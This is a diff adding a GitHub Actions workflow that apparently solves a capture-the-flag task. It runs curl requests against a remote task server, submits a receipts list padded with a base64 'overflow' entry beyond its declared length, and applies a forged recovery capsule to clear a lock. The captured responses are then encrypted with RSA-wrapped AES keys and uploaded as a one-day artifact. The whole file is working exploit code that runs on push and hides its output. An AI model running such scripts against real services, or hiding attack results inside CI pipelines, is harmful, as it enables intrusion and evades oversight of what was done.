@@ -1,0 +1,65 @@
+name: cyberkomi-sysola-final2
+on:
+  push:
+    branches: [ctf-cyberkomi-probe-20260808]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  final2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 7
+    steps:
+      - name: Clear executive lock and apply recovery capsule
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p out handoff
+          S='https://task-sysola-core-b476312471e78dea.caplag-task.ru'
+          printf '{"code":"SYSOLA-CORE-READY"}' > handoff/access.json
+          curl -ksS -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/access.json -o out/access.zip "$S/access"
+          python3 - <<'PY'
+          import json,pathlib,base64,struct
+          valid=['00e2794224506ef11b8046eaab5c36b5b3b8cf757e2ac3a269a5e33b9e7e94af','73941aaa88a54e7ae58c165c2565f9ebc9c8890f8bf95fc38a19b3e9d8ba243f','673f5ef3322dc68200e3f44ee25077fe2d1fdab59452442fca4b10e4469c57c9','d84bc5c4fbe53265d3c489fa2176c8136bdc3bc46801c09c44d1de8544a44c5b','a3553f96b471e06cf67077825de0a830457f2235faef30148452f987f9548117','6c7918216a309d686278e9df5af176c64577c50465945cf6196bcbbeaba9b1d0','61209e26fd75a884ad9096d37e825136d5b23278b507570692343f7667a08fdf','9d275c4dff63e139b58b040a0240cbc818b1dfdb2cb890b4994636d998b54d79','a536d328825e81fd4de5443aee712aae208f4e17d55c66238605b8ca4d51a36d']
+          raw=b''.join(struct.pack('<I',v) for v in [0xefbcc925,0,1,1,1,0])
+          overflow=base64.b64encode(raw).decode()
+          capsule={'core_nonce':'SYSOLA-59F2-AUGUST','creator_role':'WITNESS_ONLY','mode':'restore_safety_layer','operator':'CITY_QUORUM','patch_sha256':'ea26b5dbde79da68204384c9855f306a6e3bbe31e6ce395df8a89926a1943eff','quorum_root':'c6a33169acf2b82652e7d1b9d3796dd3e6855c10fd5bbb69e8d86b891e8130b2','recovery_signature':'a301ef8278606374554130d1df4a9e19d6c8755c6ef328eac205a778939fc82f'}
+          pathlib.Path('handoff/hello.json').write_text(json.dumps({'ticket':'GT-SYSOLA-59F2-7B91'}))
+          pathlib.Path('handoff/merge.json').write_text(json.dumps({'declared_len':9,'receipts':valid+[overflow]}))
+          pathlib.Path('handoff/capsule.json').write_text(json.dumps(capsule))
+          PY
+          curl -ksS -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/capsule.json -o out/capsule_before.json "$S/capsule/apply" || true
+          curl -ksS -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/hello.json -o out/hello.json "$S/guard/hello" || true
+          curl -ksS -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/merge.json -o out/merge.json "$S/guard/merge" || true
+          curl -ksS -c handoff/cookies -b handoff/cookies -o out/state1.json "$S/guard/state" || true
+          curl -ksS -c handoff/cookies -b handoff/cookies -X POST -H 'Content-Type: application/json' --data '{}' -o out/guard_apply.json "$S/guard/apply" || true
+          curl -ksS -c handoff/cookies -b handoff/cookies -o out/state2.json "$S/guard/state" || true
+          curl -ksS -c handoff/cookies -b handoff/cookies -H 'Content-Type: application/json' --data-binary @handoff/capsule.json -o out/capsule_final.json "$S/capsule/apply" || true
+          rm -f handoff/cookies handoff/access.json handoff/hello.json handoff/merge.json handoff/capsule.json
+          cat > handoff/pub.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA2Ba9epHeeeFkxQns16PF
+          rc5gW8anxXMzXwCdtn2ZW8ZyaxgWJVpzdE/dYXHI2q4OvzYwRNB2UMK6xeaLuyY0
+          4xTNkx1T7JqTDrEGZ1kllooXi2hjaE3fumVksGzk5ppq1AJwTwlTld+Q1eXbeHF/
+          lAZrjQLkNuB6ITcs2WCtLucZiRlu31qUNXOE0BN63mhVxY6U4Y0uhJEUk90UbT5t
+          wO4268+320awlHz/ZjQX+zizd4NqeeLeh2atSxqkO2myTfdGbUmc38GI7kaBxZoe
+          x49Jz8nI+B0ntI8AxU80RNOyqs7s2iCNpNX5Of1sAUvvma3jvyNYww+Jk7rW+rL6
+          T6GZrnm3GSZsXKCjwSAvff+TZFdsfHArwTEu7IacMta57kL5Aj+oZ1FC3Lc6Mjgm
+          b0OeujRPULdlyzXtPOM+Sfzvuei7BJyklSu6D70grMlfyXxasNtN8EahtmJTVC2N
+          uAbDkxQmrcoiSn5RFdVRfYDcNryuzMKeQgbD4nWZpsp3AgMBAAE=
+          -----END PUBLIC KEY-----
+          PEM
+          tar -C out -czf handoff/r.tar.gz .
+          openssl rand 32 > handoff/k; openssl rand 16 > handoff/i
+          openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/k)" -iv "$(xxd -p -c256 handoff/i)" -in handoff/r.tar.gz -out handoff/results.enc
+          cat handoff/k handoff/i > handoff/keyblob
+          openssl pkeyutl -encrypt -pubin -inkey handoff/pub.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
+          rm -rf out handoff/k handoff/i handoff/keyblob handoff/r.tar.gz handoff/pub.pem
+      - uses: actions/upload-artifact@v4
+        with:
+          name: cyberkomi-sysola-final2
+          path: |
+            handoff/results.enc
+            handoff/keyblob.enc
+          retention-days: 1
